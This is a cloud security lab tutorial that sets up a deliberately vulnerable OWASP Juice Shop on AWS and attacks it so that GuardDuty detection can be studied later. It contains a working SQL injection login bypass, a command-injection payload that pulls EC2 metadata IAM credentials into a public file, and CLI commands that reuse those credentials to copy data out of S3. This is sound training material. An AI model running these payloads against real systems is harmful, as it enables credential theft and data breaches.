
---

# [Threat Detection with Amazon GuardDuty](https://www.youtube.com/watch?v=nNyVl5Fs-NQ)

---

**Credits**

- This project was inspired by:
	- [NextWork](https://www.youtube.com/@itsnextwork)

---

Let's get ready to...

- 🛍️ Deploy a vulnerable web application (don't worry, it's on purpose)!
- 🔑 Bypass login with a sneaky SQL injection technique.
- 🤫 Steal sensitive data.
- 🛡️ Detect and analyze attacks using Amazon GuardDuty
- 💎 Safeguard data with S3 Malware Protection

---

Today we start a project on threat detection using **Amazon GuardDuty**. The project involves deploying a vulnerable web application (OWASP Juice Shop) using **CloudFormation**, which includes an **EC2** instance, **VPC**, **CloudFront**, and an **S3** bucket storing sensitive data. The goal is to simulate an attack using techniques like **SQL injection** and **command injection**, then analyze how GuardDuty detects and reports these threats. Finally, the optional "secret mission" involves implementing malware protection for the S3 bucket using **AWS Shield**.

This project is important for cybersecurity professionals because it provides hands-on experience in:

- Identifying and exploiting common web vulnerabilities.
- Using a machine learning-powered threat detection service (GuardDuty) to detect attacks.
- Analyzing threat detection findings and understanding the details provided by GuardDuty.

Understanding these concepts is essential for developing secure web applications and protecting cloud environments. The project bridges the gap between theoretical knowledge and practical application, making it valuable for security analysts, penetration testers, cloud security engineers, and developers alike.

**AWS Services**
- Amazon GuardDuty
- Amazon CloudFront
- Amazon S3
- Amazon EC2
- AWS CloudFormation
- AWS CloudShell
- OWASP Juice Shop

- **Prerequisites**
	- An AWS Account
	- `nextwork-guardduty-setup.yaml` CloudFormation project file (I'll provide)

- **Cost**
	- Free

- **Architecture Diagram**
	- ![image](https://github.com/user-attachments/assets/86b01073-9ddb-4b08-986f-d7191bb1b33d)

- **Key Skills/Tools:** Amazon GuardDuty, CloudFormation, OWASP Juice Shop, EC2, CloudFront, S3, SQL injection, AWS Shield

**Let's get started!**

---

## Step 1 - Deploy a Web App

<br/>

> - GuardDuty is a **threat detection** service, so there's no better way to learn than by deploying an app that GuardDuty needs to protect.
> 
> - In this first step, let's set up a web app. This web app will be insecure (i.e. full of security vulnerabilities) on purpose.
> 
> - After we deploy it, we'll attack the web app (like a hacker would), and then check if GuardDuty detected our attack.
> 
> - Don't worry, we won't need to build the entire web app from scratch although you can do that in other projects! We'll use a CloudFormation template to automate the deployment process.

<br/>

**In this step, you're going to:**
* Deploy a web app using a CloudFormation template.
* Get to know the resources that make up your web app.

<br/>

- ![image](https://github.com/user-attachments/assets/9fb83acd-d44a-4e14-bd76-1c88d63145b8)

- Let's deploy the Web App! Log in to the AWS Management Console as your IAM Admin user and make sure you're in the AWS region closest to you.
- ![image](https://github.com/user-attachments/assets/b695ca23-c754-4bf9-a3bb-d77212163ff7)
- Head to the `CloudFormation` console.
- ![image](https://github.com/user-attachments/assets/2ca68df6-ccac-43f6-853d-0c90fc4a5631)
- You'll be presented with this screen:
- ![image](https://github.com/user-attachments/assets/0ad663a5-d715-4dc2-ab3d-f0d1c02e93b5)

<br/>

> 💡 **What is AWS CloudFormation?**
> 
> - CloudFormation is a service that helps you create and manage your AWS resources.
> 
> - It's an **infrastructure as code** service - meaning you start by writing a file that describes all the resources you want to create.
> 
> - Then, CloudFormation reads your file to create, update, and delete the resources described. This saves you time from deploying the resources yourself.

- To get this project started we need to click the "Create stack" drop down menu and click **With new resources (standard)**.
- ![image](https://github.com/user-attachments/assets/1fbe9ee8-9382-46c2-b130-7b63c028b2e5)

<br/>

> 💡 **What is "Create Stack" in CloudFormation and how do we use it in this project?**
> 
> - In this project, "Create Stack" is used to deploy the insecure web application using a CloudFormation template.
> 
> - A **CloudFormation stack** is a collection of AWS resources that are managed as a single unit. The template you upload defines all the resources (like EC2 instances, S3 buckets, and network settings) needed for the web app.
> 
> - When you create the stack, CloudFormation automatically provisions all these resources according to the template. This is much faster than setting up each resource individually.

<br/>

- We're now brought to the "Create Stack" page.
- ![image](https://github.com/user-attachments/assets/eddbfb6c-faa9-4267-a009-80a4354e7014)
- For the "**Prerequisite - Prepare template**" section, within the "**Prepare template**" subsection, we'll leave the default option of "**Choose and existing template**".
- ![image](https://github.com/user-attachments/assets/2ae2c578-d686-48b6-8460-e4d0e6fe8558)
- In the "**Specify template**" section, within the "**Template source**" subsection, we'll select the "**Upload a template file**" option. Then choose the project file "**`nextwork-guardduty-setup.yaml`**" (I'll provide it **[here](./Assets/Threat%20Detection%20with%20Amazon%20GuardDuty%20Assets/nextwork-guardduty-setup.yaml)**). Once you upload the file, an S3 URL will be generated. Once you're done, click "**Next**".
- ![image](https://github.com/user-attachments/assets/285096ea-c960-4b18-b62f-fd480b2d58f1)

<br/>

> 💡 **Breaking Down Our CloudFormation Template**
> 	- The CloudFormation template we're deploying creates 27 resources that makes up a web app!
> 	
> 	- This web app is a copy of a very popular web app for security training, called the OWASP Juice Shop.

<br/>

> 💡 **What is the OWASP Juice Shop? Why are we using it?**  
> 	- The OWASP Juice Shop is a web application designed for security training. What we've deployed is our own copy of it.
> 	
> 	- The OWASP Juice Shop was built with many security flaws on purpose. This lets security engineers practice finding and fixing security problems in a safe environment!
> 	
> 	- _Tip:_ OWASP stands for the **Open Worldwide Application Security Project**. OWASP is a nonprofit online community dedicated to improving software security! They create free resources, and anyone can contribute to an OWASP project (like creating the Juice Shop).

<br/>

- Now we're on the "**Specify stack details**" page.
	- **Sections**
		- **Provide a stack name**: For Stack name, you can enter `GuardDuty-project-yourname`. Make sure to replace `yourname` with your name. Your stack name must be unique across your entire Region. Change your stack name again if it's already taken. I'll choose `GuardDuty-project-am`.
		- **Parameters**: Leave as defaults unless you know what you are doing.
	- Click "**Next**"
	- ![image](https://github.com/user-attachments/assets/3f68c76d-88dc-40d1-b9a6-c07e243fe308)
- This brings us to the "**Configure stack options**" page.
	- **Sections**
		- **Tags - _optional_**: Skip
		- **Permissions - _optional_**: Skip
		- ![image](https://github.com/user-attachments/assets/73724429-7f88-4fd8-b93b-49a3685295a7)
		- **Stack failure options**:
			- **Behavior on provisioning failure**: Leave default option of "**Roll back all stack resources**"
			- **Delete newly created resources during a rollback**: Select "**Delete all newly created resources"
			- ![image](https://github.com/user-attachments/assets/a6fd46b9-8b44-4cba-bb89-bcac13ac9a84)
		- **Advanced options**: Skip
		- **Capabilities**: Check the "**I acknowledge that AWS CloudFormation might create IAM resources.**" checkbox.
	- Click "**Next**".
	- ![image](https://github.com/user-attachments/assets/37a74303-a813-4d53-9ed1-0925db4f796c)
- On the "**Review and create**" page, review everything to make sure it is OK and then click "**Submit**".
- ![image](https://github.com/user-attachments/assets/5e2e7928-b274-411e-8e0e-a73bbad4b28f)
- ![image](https://github.com/user-attachments/assets/5f72d82f-88d2-4e0b-a8a5-cff71c7fd01b)
- ![image](https://github.com/user-attachments/assets/7367a757-daa5-4455-bed9-73873224653f)
- ![image](https://github.com/user-attachments/assets/2c8e8813-ea3e-493d-aa6d-1bfeca9e67fe)
- Once we click "**Submit**", we are brought to a screen that says the stack is in progress of being created:
- ![image](https://github.com/user-attachments/assets/4a9b3901-6949-4d8f-ae78-dc88187e4a94)
- The deployment takes up to 10 minutes, so while we wait, let's explore what we're deploying!

- ![image](https://github.com/user-attachments/assets/f5e982eb-402f-46e1-b273-e65151160d55)

>  🧱 **Breakdown of Deployed Resources**
>  
> - These 27 resources can be grouped into three main categories:
>   - 1️⃣ **Web App Infrastructure**
> 	 - Your web app is hosted on an **EC2 instance**, which acts as the engine running the web app's files. It processes incoming requests and returns responses to users accessing the app.
> 		 - The **web app files** are stored directly on this EC2 instance, allowing it to serve content directly.
> 		 - The template also creates **custom networking resources**, including:
> 			- A new **VPC** (Virtual Private Cloud)
> 			- Subnets, route tables, and gateways
> 			- This follows AWS best practices, keeping your default VPC untouched and isolating the app’s environment.
>		  - **CloudFront distribution** is set up to improve speed and performance. Once deployment is complete, your web app will be accessible via a public URL served through CloudFront.
> 	- 2️⃣ **S3 Bucket for storage**
>		  - This CloudFormation template also launches an **S3 bucket**.
>			- This bucket stores a text file named **`important-information.txt`**, which is meant to simulate sensitive data. ⚠️ Your web server (EC2 instance) has access to the objects in this bucket. ⚠️
>			- Later in this project, **we're going to act as the hacker that gets access to this file and read its contents** i.e. perform a data breach. 😈
>	  - 3️⃣ **GuardDuty for security monitoring**
>		   - As you might imagine, there are quite a few moving parts in this web app! This means there are lots of opportunity for security vulnerabilities to exist, which means there are lots of ways hackers can get access into your infrastructure.
>		   - Because of this, GuardDuty is also in this template and is automatically enabled for monitoring and threat detection.
>		   - Later on, after we hack into this web app, we'll jump back into GuardDuty to see whether it's picked up on the incoming threats.

<br/>

>   💡 **What are the specific networking resources we've deployed?**  
> - The networking resources created by this template include:
> 
>   - **VPC**
>   - **Subnets**
>   - **Security group**
>   - **Internet gateway**
>   - **Route tables**
>   - **VPC endpoints**
>   - **Elastic Load Balancer**
>   - **Auto Scaling Group**
>   - **Launch Templates**
>   - **Prefix Lists**

<br/>

- Don't forget, **this project is about threat detection with Amazon GuardDuty**.
- We've deployed the web app with a CloudFormation template (instead of setting it up manually) so we have can start to hack it straight away. This lets you spend more time in GuardDuty and analyze whether it's picked up on your attacks.

<br/>

> 💡 **What is GuardDuty? How is it an AI service?**
> 
> - AWS GuardDuty is a threat detection service, which means it helps you find potential security risks or attacks in your apps and AWS environment.
> 
> - It uses machine learning to look for unusual activity in your AWS account, like your network traffic and CloudTrail activity logs. If it finds something suspicious, it will alert you so you can investigate.

<br/>

- Heading back to the "**Stacks**" page, we can validate our stack's deployment and see it's complete because the status says `CREATE_COMPLETE`. We can also check the "**Stack info**" tab for more information.
- ![image](https://github.com/user-attachments/assets/2e3d8e35-a08a-49f5-9ce1-668488786535)
- Here is the "**Events**" tab:
- ![image](https://github.com/user-attachments/assets/a18675c1-8149-42f5-9f69-e8fc0a80851e)
- Our "**Resources**" tab with our 27 resources:
- ![image](https://github.com/user-attachments/assets/e6e6bdb2-9d68-4aa0-83f9-d30660d7eba2)
- And "**Outputs**" tab. We'll stop here so we can continue with the project, but you can continue looking through the other tabs on your own.
- ![image](https://github.com/user-attachments/assets/66fe31b3-b84c-42ab-988d-a72d554ce048)
- ✅ This completes **Step 1 - Deploy a Web App**!

<br/>

> - Now that we've deployed our web app, let's try opening it. Then, we'll enter 😈 hacker mode 😈 and see whether we can hack our way into the web app's admin portal.

<br/>

---

## Step 2 - Log Into Your Web App

<br/>

**In this step, we're going to:**
- Open your running web app.
- Use a hacking technique to bypass logging into the admin portal.

<br/>

- ![image](https://github.com/user-attachments/assets/923a6d84-c5e7-4ca6-b2a5-8655fe359613)

<br/>

- Let's locate `JuiceShopURL`. In your CloudFormation console, stay in your stack's window. Remember we looked at the "**Outputs**" tab last? The first Key we see is `JuiceShopURL`. Right click on the Value (link) and open it in a new tab.
- ![image](https://github.com/user-attachments/assets/9a280827-0c88-4a99-875a-fbb62173299d)

<br/>

> 💡 **What does the outputs tab show?**
> 
> - Outputs are a way to store important information about your resources in AWS CloudFormation. The person that writes the CloudFormation template would define an `Outputs` section, so anyone that deploys the template (like you) will see a neat list of important information that they should know.
> 
> - Think of outputs like labels you can add to your resources. For example, you can use them to store things like the name of an S3 bucket or the URL of a website. This makes it easier to find and manage your resources.
> 
> - You can also use outputs to share information between different stacks. This is helpful if you need to use the same resources in multiple stacks.

<br/>

> 💡 **What is the `JuiceShopURL`?**
> 
> - This URL points to the web app you've deployed, which is the OWASP Juice Shop.
>
> - The URL you see won't be the exact same URL as what you see in the screenshot. This is because the URL was dynamically grabbed from the CloudFront distribution you deployed. CloudFront creates a new URL for every new deployment, so you know your URL is unique.

<br/>

- Once we open the new tab we are presented with our new vulnerable web app, the **OWASP Juice Shop**!
- ![image](https://github.com/user-attachments/assets/c986817f-b8cf-4586-bcbd-185601c275a9)

<br/>

> 💡 **Woah! What am I seeing here?**
> 
> - Welcome to the OWASP Juice Shop! This is the web app you've deployed with your CloudFormation template. The web app itself is a juice shop store, where there is a storefront that customers can shop, but also an admin page that requires a login.
> 
> - As a reminder - the OWASP Juice Shop is a web app designed to help people learn about security risks. It's like a practice website where you can try to find security flaws without causing any real harm. This way, you can learn how to protect real websites from hackers.

<br/>

> - It's time to put on your hacker hat! You've now entered 😈 hacker mode 😈
> 
> - We are no longer the person that deployed the web app!
> 
> - Pretend that, as a hacker, you've visited the OWASP Juice Shop web app and decided to try steal confidential data.

<br/>

- Let's log in to our web app. At the top right corner, click the **Account** icon and then click **Login**.
- ![image](https://github.com/user-attachments/assets/9e6d49ea-ff83-434c-9dda-8cbae48677fd)
- Keep in mind that as a hacker we don't have a login. We are not an admin of this page, but want to get inside. So what can we do to get through this login page? Well here's what we'll try first:
	- On the login page, enter the following ~mysterious~ string in the **email** field: `' or 1=1;--`
- ![image](https://github.com/user-attachments/assets/009697db-72bc-4e90-8eff-56db6c99d69a)

<br/>

> 💡 **What am I doing?**
> 
> - While entering these values might look simple, you are actually doing a security attack called an **SQL injection**!
> 
> - SQL injection is a web vulnerability that happens when an attacker can insert malicious SQL code into an application's database queries. This can let them bypass authentication, steal data, or even change the database structure.
> 
> 💡 **How is this an SQL injection? What are we doing as an attack?**
> 
> - What you've entered manipulates the SQL query used for login. The `' or 1=1;--` part makes the query always evaluate to true, which lets you avoid the authentication check.

<br/>

- Now type in any password you want and then you can log in!
- ![image](https://github.com/user-attachments/assets/6783b37d-7547-4a47-8fdf-01cd03c71139)
- Success! We're in!
	- The SQL injection attack was successful because the web application didn't properly sanitize user inputs. We entered a specially crafted string (' or 1=1;--') into the email field of the login form. This string manipulated the SQL query used to verify login credentials. Instead of checking if a username and password combination existed in the database, our input caused the query to always evaluate to true ('1=1' is always true), bypassing the authentication process. The database returned 'yes', regardless of the actual password entered, allowing us to log in with any password. The application's failure to validate and sanitize the input allowed this malicious SQL code to execute, resulting in a successful attack.
- ![image](https://github.com/user-attachments/assets/b0ee1843-5f32-4afc-933c-72d0468d1ce3)
- ✅ **Step 2 - Log Into your Web App** is complete!

<br/>

> - Having bypassed the login page, we'll stay in 😈 hacker mode 😈 and do our next move - stealing credentials to the web app host's AWS environment!
> 
> - You guessed it. **We're** the web app host, since you're the one that deployed this web app.

<br/>

---

## Step 3 - Exploit the Web App

<br/>

**In this step, you're going to:**
- Steal AWS credentials.
- Access the stolen credentials

<br/>

- ![image](https://github.com/user-attachments/assets/c38d3679-9b50-4811-b927-1f83d2cf7758)

<br/>

- Let's run **malicious code**! To begin, click the Account option on the top right hand corner. Then, click your admin@juice-sh.op email.
- ![image](https://github.com/user-attachments/assets/1eebd98d-2c9b-47f3-bb91-424a2438bb7b)
- Here we see a profile page:
- ![image](https://github.com/user-attachments/assets/5f6fb64e-2c61-4e76-ad55-e0fa5782c088)
- Click into the "**Username**:" field, and paste the following JavaScript code:

<br/>

```javascript
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
```

<br/>

- ![image](https://github.com/user-attachments/assets/6187e6ed-84fa-45e2-972e-f65b37ddea71)

<br/>

> [!NOTE]
>  💡 **Why are we entering code in the Username field?**
> 
> Imagine asking someone for their name—but instead, they put you in a trance, hand you instructions to unlock your phone, and you end up giving it to **THEM**. That's essentially what happens during **command injection** on the admin portal of our web app.
> 
> This is a **serious security vulnerability** where the server misinterprets input data as executable commands. The web app expected a username, but instead received a script that steals **IAM credentials** from the EC2 instance it's running on.
> 
> 🧨 **Impact:** Attackers can use this technique to access sensitive data, manipulate services, or even gain control over cloud infrastructure.
> 
> ---
> 
> 💡 **Why does this vulnerability exist?**
> 
> The core issue lies in the app’s failure to **sanitize input**. Input sanitization ensures user-submitted data is treated as plain text—not executable code.
> 
> Without sanitization, attackers can inject malicious commands, which the server then unknowingly executes.
> 
> ---
> 
> 💡 **What does this code do?** This step demonstrates a real-world **command injection attack** that exploits a vulnerable input field in the web app. By entering malicious code instead of a simple username, attackers can execute unauthorized commands on the EC2 instance behind the application.
> 
> The payload fetches **AWS IAM credentials** from the EC2 metadata service and stores them in a public location.
> 
> 1. `CREDURL=[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)`  
>     This sets up an address pointing to the **EC2 instance metadata service**—a local-only AWS service that contains sensitive info like IAM credentials. By injecting this into the app, you're instructing the EC2 instance to expose its own secrets.
>     
> 2. `TOKEN=\curl -X PUT "[http://169.254.169.254/latest/api/token](http://169.254.169.254/latest/api/token)" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`  
>     This line retrieves a **session token** to access the metadata service. The token acts as temporary authorization for the next call, simulating the app’s internal process.
>     
> 3. `CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN")`  
>     This powerful line chains multiple commands to request IAM credentials from the EC2 metadata service and format them. It impersonates legitimate access using the token, then fetches each credential path individually.
>     
> 4. `echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json`  
>     The output (the credentials) is saved into a publicly accessible file in the web server’s asset folder. **Anyone visiting the site can now access sensitive AWS credentials**, which is a massive security breach.
>     
> 
> ---
> 
> 🔗 Bonus: Want to understand this better? Visit the [EC2 Instance Metadata documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).

<br/>

- After the code is pasted, click "**Set Username**". Notice the username change from `\` to `[object Object]`.
- ![image](https://github.com/user-attachments/assets/9a8bb2f2-80fc-47b5-b18a-a426921cb9d0)

>💡 **Why is the username showing `[object Object]`?**
>
> - This is a classic result of a **command injection vulnerability**. In this scenario, you injected a script into the **Username** field. The web server didn’t sanitize the input and treated it as valid code to execute.
> 
> - Normally, the username should display a simple string. But instead, it’s showing **`[object Object]`**, which is how JavaScript represents a full object when it’s coerced into a string.
> 
> - In other words, your script created a new JavaScript object (the **IAM credentials**) and when the app tried to display it as text—it just showed `[object Object]`. The username is designed to just display some text, but it'll default to `[object Object]` instead if it's displaying an entire JavaScript object.
> 
> - This confirms that the injected code worked, and the server responded by storing the AWS credentials in a JSON object, as instructed. The JavaScript object is the **`credentials.json`** file that your malicious script told the server to create!
> 
> - 🧠 So to summarize, the script is telling the web server to go create a file called `credentials.json` and use that to store the IAM credentials of it (the web server) to the AWS environment that it belongs to... and once it has created that file, make that file public within the web app. The file should be somewhere... By seeing `[object Object]`, we see that as a confirmation that a file has at least been created somewhere. All we have to do now is find that file! 🔎

<br/>

- Let's find those stolen credentials! We'll head to the following URL to view the stolen credentials:
	- `[JuiceShopURL]/assets/public/credentials.json`
	- Make sure to replace `JuiceShopURL` with your hosted web app's URL.
	- ![image](https://github.com/user-attachments/assets/682010aa-bdcb-4685-a496-7c2fea72cdaf)

<br/>

> 💡 **Where can I find `JuiceShopURL`?**
> 
>	- Head back into the CloudFormation console, and find `JuiceShopURL` in the Outputs section again!
	![image](https://github.com/user-attachments/assets/98a95e3b-833a-46cd-9ccd-068195cba41e)

<br/>

- When we head to the URL we find what we are looking for! The credentials that we exposed in our code are now right here in front of us to see! An `AccessKeyId`, `Secret AccessKey`, `Token`, and more confidential information that should never be exposed. To make it worse, this is a **public** URL that you can give anyone and they will be able to access this as well! Of course this is concerning for the project, but rest assured this only gives them access to the S3 bucket we deployed earlier.
- ![image](https://github.com/user-attachments/assets/7e2fe147-5372-4ebf-940f-726f102d8976)

<br/>

> 💡 **What are these credentials, why are they a big deal?**
> 
> - These credentials you're looking at are the web app's keys to accessing AWS resources in the developer's account (i.e. your account).
> 
> - They are a big deal because they let whoever possesses them to interact with AWS services just like the web app can. This means they could potentially access sensitive data, modify resources, or even incur costs, all under the guise of the legitimate application.
> 
> - If these credentials were to fall into the wrong hands (such as the hacker), it could lead to unauthorized access and security vulnerabilities for developers, apps and companies.

<br/>

> 💡 **What is each line saying?**
> 
> - The JSON credential file contains information about your AWS access credentials:
> 	- **`AccessKeyId`** and **`SecretAccessKey`** are your main keys for accessing AWS services.
> 	- **`Token`** adds extra security to your session and is used with your access keys.
> 	- **`Expiration`** tells you when your credentials will stop working.
> 	- **`Code`** and **`Type`** show the status and type of your credentials.

<br/>

> [!NOTE]
> > 💡 **How did this become a URL we can access?**
> > 	**TLDR**: The code you ran placed the stolen credentials into a file that's easy to access through a URL within the Juice Shop app. These credentials, which are temporary AWS access keys, allow access to different AWS services.
> > 	
> > 	**Longer Version**: You didn't explicitly include the full CloudFront URL in your command injection. However, the connection looks like this:
> 
> 1. Your command injects this line into the server:
> 
> ```shell
> echo $CRED | json_pp > frontend/dist/frontend/assets/public/credentials.json
> ```
> 
> This writes the **stolen IAM credentials** to a file in the local file system of the Juice Shop app.
> 
> 2. Juice Shop is most likely being served through **CloudFront** as a static web app. This means:
> 
> - The `frontend/dist/frontend` directory is **publicly served** as part of the web app. **CloudFront acts as the CDN/front-door** to the web content.
> 
> 2. That’s why you can access this file at:
> 
> ```http
> https://[JuiceShopURL]/assets/public/credentials.json
> ```
> 
> This URL corresponds to:  
> `/frontend/dist/frontend/assets/public/credentials.json`  
> Because that’s where the file was written during the injection.
> 
> 🧭 **In short:**
> 
> - Your command injection **didn’t include** the CloudFront URL directly.
> - But it **wrote the file** to a location that is **exposed** via your app's CloudFront-distributed frontend.
> - CloudFront is just the **public-facing entry point** that makes that path available over HTTPS.

<br/>

- ✅ **Step 3 - Exploit the Web App** is now complete! In this step, to verify the attack's success, we visited the publicly exposed credentials file. This page showed us access keys that represents our EC2 instance's access to the developer's AWS environment. We can use those keys to get the same level of access.

<br/>

> - Now that we have the stolen credentials, we'll stay in 😈 hacker mode 😈 to do one last move... stealing **sensitive data** stored in the web app host's AWS environment!
> 
> - To do this, we'll use **AWS CloudShell** as the hacker, and run commands that lets us access the host's S3 bucket. These commands would use permissions granted by the stolen credentials, so we'll get access to secret stored inside the S3 bucket in no time.

<br/>

---

## Step 4 - Steal Data with Stolen Credentials

<br/>

**In this step, you're going to:**
- Open AWS CloudShell.
- Configure AWS CLI with the stolen credentials.
- Copy the secret file from the S3 bucket.

<br/>

- ![image](https://github.com/user-attachments/assets/8d573f62-f040-463d-82ee-98158b5df64f)

<br/>

- In this step, we will enter the developer's AWS environment using the credentials we've just stolen from the EC2 instance running this web app. Once we've entered into the environment, we will also steal data that's been stored in an S3 bucket.
	- 🧠 **Quick Recap** - So far as the hacker, we've hacked into a Web App called the OWASP Juice Shop. We used **SQL injection** to bypass the login to get into the admin page of the Juice Shop. Then, in the username field, we entered some commands (this was **command injection**). Those commands we entered told the EC2 instance that's hosting this web app "Hey, can you go and give me your IAM credentials?" which gives us access to an S3 bucket in the backend. The EC2 instance goes and runs the code we entered into the username field and retrieves the IAM credentials that we wanted. Now us, as the attacker, has access to the credentials that the EC2 instance passed to us. So our plan now is to use the credentials that has been given to us to access the objects that are in the S3 bucket ourselves.

<br/>

- Let's begin by opening **AWS CloudShell**. Head back into the AWS Management Console. Open the **CloudShell** console, which sits at the top of your AWS Management Console.
- ![image](https://github.com/user-attachments/assets/aff584c5-9a97-4278-ae6c-26d2cb1cc04d)
- You should see the terminal in the bottom half of your screen.
- ![image](https://github.com/user-attachments/assets/d7c9d6c4-a035-4990-b37e-a20f212bed28)

<br/>

> 💡 **What is CloudShell?**
> 
> - AWS CloudShell is a space for you to run code in the Management Console. You can use it to manage your AWS resources using code, which is often much more efficient than clicking around in the console.
>
> 💡 **Why are we using CloudShell?**
> 
> - In this step, we're trying to get access to private data using stolen credentials. To do this, you have to keep the hacker hat on and try to hack into your own AWS environment. We'll use CloudShell to run commands that a hacker would run to steal data inside your AWS environment.

<br/>

> 💡 **How can I simulate a hacker and 'steal data' while logged into my own AWS account?**
> 
> - Great question! Typically, hackers don't start with access to their victim's AWS environment; they find or force their way in. But since we are both the owner and the 'hacker' in this project, we already have access. So, how can we step into the shoes of an outsider without this access?
> 
> - ⭐ A useful way to create this outsider scenario is actually to use AWS CloudShell. When you use CloudShell, it doesn't just run commands under your main AWS account. Instead, AWS assigns the session a **temporary** AWS account with a **different account ID** than your main one. AWS does this to better monitor and log each command you run via CloudShell, linking them back to the specific session and user.
> 
> - Because your CloudShell session is using a **different account ID**, imagine what might happen if you run commands **using the stolen credentials**. Alarm bells will go off for GuardDuty - another AWS account is using credentials that belong to your EC2 instance! That's definitely suspicious activity.
> 
> 💡 **But I run commands using CloudShell all the time, why weren't those threats?**
> 
> - Normally, CloudShell inherits your IAM user's permissions, and the commands you run are considered safe.
> 
> - However, we're about to use CloudShell with the stolen credentials (instead of your IAM user's credentials). Then, we're using the credentials to accessing specific resources, which strays from an EC2 instance's usual activity. This flags as suspicious to AWS GuardDuty.
> 
> - In short, it's not the use of CloudShell that triggers GuardDuty, but the credentials you're using and the things you're doing with those credentials.

<br/>

- Now we will run a command to set an environment variable. Make sure to replace `[JuiceShopURL]` with the `JUICESHOPURL` URL from your CloudFormation stack. Here is the code: `export JUICESHOPURL="[JuiceShopURL]"`. So for me `export JUICESHOPURL="https://d2u65zkfoc22qv.cloudfront.net/"`. This makes it so that CloudShell will now remember the whole URL as `JUICESHOPURL` instead of us having to type the whole URL out. When you pasted the command, press "**Enter**" on your keyboard.
- ![image](https://github.com/user-attachments/assets/47a16d5d-bb61-45f6-82e8-256a657c915f)
- Next we are going to store another variable. We'll set the `JUICESHOPS3BUCKET` environment variable. Make sure to replace `[TheSecureBucket]` with the `TheSecureBucket` **value** from your CloudFormation **Outputs** section (same place where you have your `JuiceShopURL`.
- ![image](https://github.com/user-attachments/assets/cc33a3e2-94a2-40de-bf8b-4c3a0bb3b183)
- Here is the code: `export JUICESHOPS3BUCKET="[TheSecureBucket]"`. Paste it into CloudShell and press "**Enter**".
- ![image](https://github.com/user-attachments/assets/1ac19062-b3fb-4b7e-b5a8-03de08275071)
- The next command we will run will download and display the credentials. Run the following command to download your stolen credentials: `wget $JUICESHOPURL/assets/public/credentials.json`
- ![image](https://github.com/user-attachments/assets/75012db6-e060-474d-a65d-b9a0737ba67f)

<br/>

> 💡 **What does this code do?**
> 
> - `wget` is a command-line tool used to download files from the internet.
> 
> - In this case, we're using it to download the **credentials.json** file from our web app and into the CloudShell environment. This means there's now a local file in CloudShell that contains the stolen credentials!
> 
> - Notice how we're using `$JUICESHOPURL` in the command. That's our environment variable at work - it's automatically pulling the JUICESHOPURL you've saved previously, and using it in the command so you don't have to type it out yourself.

<br/>

- We'll now display the credentials with `cat credentials.json | jq`. `cat` shows the file, `jq` formats it nicely. `|` combines `cat` and `jq`.
- ![image](https://github.com/user-attachments/assets/7c9ff655-94a2-43b0-8bbb-99a666e642a6)
- Our next set of commands will be used to configure an AWS CLI profile named **stolen** using the downloaded credentials:

<br/>

```bash
aws configure set profile.stolen.region us-east-1
aws configure set profile.stolen.aws_access_key_id `cat credentials.json | jq -r '.AccessKeyId'`
aws configure set profile.stolen.aws_secret_access_key `cat credentials.json | jq -r '.SecretAccessKey'`
aws configure set profile.stolen.aws_session_token `cat credentials.json | jq -r '.Token'`
```

<br/>

- ![image](https://github.com/user-attachments/assets/ee595b03-851b-46ce-b88b-139db6c02942)

<br/>

> **💡 What is an AWS CLI profile?**
> 
> - An AWS CLI profile stores credentials and settings to authenticate and access AWS services. Each profile includes your access key, secret key, session token (if applicable), and region. Profiles help isolate environments or simulate different user access levels.
> 
> 💡 **What is the current profile in CloudShell?**
> 
> - By default, AWS CloudShell uses a profile that takes all the permissions granted to the user you're logged into in the Management Console.
> 
> **💡 Why create a new profile?**
> 
> - In this case, we’re setting up a new profile named `stolen` using credentials extracted from the vulnerable web app. This simulates how an attacker might use exposed credentials from another environment.
> 
> - 🚨 *Note*: Make sure your AWS CloudShell terminal session stays open for the rest of this step, as we will reuse these credentials later!

<br/>

- Our next command is to copy the secret file. Using the stolen credentials, copy the **`secret-information.txt`** file from the S3 bucket: `aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen`. After you pasted the command, press "**Enter**".
- ![image](https://github.com/user-attachments/assets/8c1af7b5-7a16-4d50-9ef5-a5acab199c48)
- Run `ls` to confirm the file is there.
- ![image](https://github.com/user-attachments/assets/608c79b8-dc01-476a-899c-9eb80b4315f0)

<br/>

> 💡 **What have you done as the attacker?**
> 
> - As the attacker (i.e. using the profile called stolen), you've just gained access to sensitive data stored in an S3 bucket. You've also just made a copy of the file and saved it in the CloudShell environment.
> 
> - In the real world, this could lead to data breaches, financial losses, and damages to a company's reputation.

<br/>

- Let's try and read the secret file with `cat secret-information.txt`! We should see "**Dang it - if you can see this text, you're accessing our private information!**"
- ![image](https://github.com/user-attachments/assets/e0d98f36-6a95-4d86-b681-f02e772b0770)
- Just like that we've got access to the company's secret information! Let's recap what we've done as the hacker:
	- 🧃 Infiltrated the vulnerable **Juice Shop web app**.
	- 🕳️ Exploited a **SQL injection** to bypass authentication on the admin portal.
	- 💣 Launched a **command injection attack** that forced the EC2 instance to leak its IAM credentials into a publicly accessible location.
	- 🌐 Navigated to the leaked credentials URL and **exfiltrated sensitive IAM data**.
	- 💻 Used AWS CloudShell to **download and parse the credentials** into a new CLI profile.
	- 🛠️ Created a new AWS CLI profile (`stolen`) and used it to impersonate the EC2 instance.
	- 📦 Gained unauthorized access to an S3 bucket using the stolen role’s permissions.
	- 📄 Successfully accessed and revealed the contents of a secret file meant to be private.

<br/>

**🎯 Outcome:** **Step 4 - Steal Data with Stolen Credentials** is complete! ✅ We’ve completed a full-cycle cloud credential exfiltration and data breach simulation—demonstrating how vulnerable applications can expose entire cloud environments when left unprotected.
